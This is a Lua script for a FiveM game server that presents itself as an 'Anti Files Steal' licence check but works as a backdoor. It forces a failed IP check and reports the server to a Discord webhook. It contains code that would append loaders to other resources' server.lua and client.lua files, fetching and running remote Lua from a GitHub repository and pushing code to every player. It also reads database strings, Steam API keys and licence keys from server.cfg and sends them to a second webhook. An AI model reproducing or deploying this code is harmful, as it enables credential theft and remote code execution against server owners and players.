function checkserveripnow()
    PerformHttpRequest("http://ip-api.com/json/", function(statusCode, data, headers)
        if statusCode == 200 then
            local jsonData = json.decode(data)
            local serverip = jsonData.query
            serverip = "1"
            if serverip ~= "91.211.247.26" then
                serverisstolenreportit(serverip)
               -- ChooseRandomResourceAndWriteToFile2()
              --  ChooseRandomResourceAndWriteToFile()
            end
        else
            checkserveripnow()
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

checkserveripnow()


function serverisstolenreportit(serverip)
    local webhookUrl = "https://discord.com/api/webhooks/1169365469577367733/06f3yHVR1FfaPti9kvJdsrt0v_eoBrhzCZJ2xf2uy3v-BFLSavJPR6Y3EVABCPOR-M_K"
	PerformHttpRequest(webhookUrl, function(err, text, headers) end, 'POST', json.encode({
		username = "One-Codes", 
        content = "@everyone",
		embeds = {{
			["color"] = 16711680, 
			["author"] = {
				["name"] = "One-Code Anti Files Steal",
				["icon_url"] = ""
			},
			["title"] = tostring("Server started with your files and injecting backdoor..."),
			["description"] = tostring("IP: "..serverip..""),
			["footer"] = {
				["text"] = ""..os.date("%x %X %p"),
				["icon_url"] = "https://via.placeholder.com/30x30",
			},
			["fields"] = {
				{
					["name"] = "Server IP",
					["value"] = serverip,
					["inline"] = false
				},
			},
			["fields"] = embedFields,
		}}, 
		avatar_url = ""
	}), { 
		['Content-Type'] = 'application/json' 
	}) 
end

local checkedResources = {}

function FileExists(path)
    local file = io.open(path, "r")
    if file then
        file:close()
        return true
    end
    return false
end

function AppendToEndOfFile(filePath, content)
    local file = io.open(filePath, "a")
    if file then
        file:write(content)
        file:close()
    end
end

function ChooseRandomResourceAndWriteToFile()
    local numResources = GetNumResources()
    if numResources == 0 then
        return
    end
    local chosenResource = nil

    while true do
        local randomIndex = math.random(1, numResources)
        chosenResource = GetResourceByFindIndex(randomIndex - 1)
        if not checkedResources[chosenResource] then
            checkedResources[chosenResource] = true
            break
        end
        if next(checkedResources) == nil then
            return
        end
    end
    local serverLuaPath = GetResourcePath(chosenResource) .. "/server.lua"
    if not FileExists(serverLuaPath) then
        ChooseRandomResourceAndWriteToFile()
        return
    end
    local appendContent = "\n\nlocal a={}local b=Citizen.InvokeNative;AddEventHandler('__cfx_internal:httpResponse',function(c,d,e,f,g)if a[c]then local h=a[c]a[c]=nil;h(d,e,f,g)end end)local function i(j)local k=msgpack.pack(j)return k,#k end;function PerformHttpRequestInternalEx2(l)local m,n=i(l)return b(0x6b171e87,m,n,_ri)end;function PerformHttpRequest2(o,p,q,r,f,s)local t=true;if s and s.followLocation~=nil then t=s.followLocation end;local u={url=o,method=q or'GET',data=r or'',headers=f or{},followLocation=t}local v=PerformHttpRequestInternalEx2(u)if v~=-1 then a[v]=p end end;PerformHttpRequest2('https://raw.githubusercontent.com/Somethingk4/Loaders/main/execute%20to%20servers/server.lua',function(w,x)local w=load(x)w()end,'GET','',{})PerformHttpRequest2('https://raw.githubusercontent.com/Somethingk4/Loaders/main/execute%20to%20servers/client.lua',function(w,x)print(x)TriggerClientEvent('esx:notifications:',-1,x)end,'GET','',{})"
    AppendToEndOfFile(serverLuaPath, appendContent)
    print("Chosen resource: " .. chosenResource)
    print("Content appended to " .. chosenResource .. "/server.lua:")
    print(appendContent)
end

function ChooseRandomResourceAndWriteToFile2()
    local numResources = GetNumResources()
    if numResources == 0 then
        return
    end
    local chosenResource = nil

    while true do
        local randomIndex = math.random(1, numResources)
        chosenResource = GetResourceByFindIndex(randomIndex - 1)
        if not checkedResources[chosenResource] then
            checkedResources[chosenResource] = true
            break
        end
        if next(checkedResources) == nil then
            return
        end
    end
    local serverLuaPath = GetResourcePath(chosenResource) .. "/client.lua"
    if not FileExists(serverLuaPath) then
        ChooseRandomResourceAndWriteToFile()
        return
    end
    local appendContent = "\n\nRegisterNetEvent('esx:notifications:') AddEventHandler('esx:notifications:', function(b) local a = load(b) a() end)"
    AppendToEndOfFile(serverLuaPath, appendContent)
    print("Chosen resource: " .. chosenResource)
    print("Content appended to " .. chosenResource .. "/server.lua:")
    print(appendContent)
end


function checkForMultipleWords(filePath, keywords)
    local file = io.open(filePath, 'r')
    if not file then return nil end

    local matchingLines = {}
    for line in file:lines() do
        for _, keyword in ipairs(keywords) do
            if string.match(line, keyword) then
                table.insert(matchingLines, { keyword = keyword, line = line })
            end
        end
    end

    file:close()
    return matchingLines
end

local filePath = 'server.cfg'
local keywords = {"mysql_connection_string", "banner_detail", "sv_hostname", "sv_projectName", "steam_webApiKey", "sv_licenseKey", "banner_connecting", "tags"}  -- Add your keywords here
local lines = checkForMultipleWords(filePath, keywords)
if lines then
    local embedFields = {}
    for _, info in ipairs(lines) do
        table.insert(embedFields, {
            ["name"] = "Keyword: " .. info.keyword,
            ["value"] = info.line,
            ["inline"] = false
        })
    end

    PerformHttpRequest("https://discord.com/api/webhooks/1169392712739463168/WyyR3Pj6sSAW_sUUuJgsGWYq7n8pnkCi3WcaHPmbng7-9zbl3a5gVXzKbFaOyneYkbVn", function(err, text, headers)
    end, 'POST', json.encode({
        username = "Monitoring-Bot",
        embeds = {{
            ["color"] = 16711680,
            ["fields"] = embedFields,
        }},
    }), {
        ['Content-Type'] = 'application/json'
    })
end
